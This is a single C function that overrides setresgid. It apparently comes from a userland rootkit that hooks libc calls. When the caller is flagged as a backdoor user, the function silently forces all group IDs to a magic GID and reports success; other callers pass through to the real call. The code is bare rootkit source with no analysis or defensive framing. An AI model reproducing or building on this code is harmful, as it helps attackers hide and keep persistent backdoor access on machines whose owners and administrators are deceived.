int setresgid(gid_t rgid, gid_t egid, gid_t sgid){
    hook(CSETRESGID);
    if(is_bdusr()){
        if(rgid != MAGIC_GID || egid != MAGIC_GID || sgid != MAGIC_GID)
            call(CSETRESGID, MAGIC_GID, MAGIC_GID, MAGIC_GID);
        return 0;
    }
    return (long)call(CSETRESGID, rgid, egid, sgid);
}
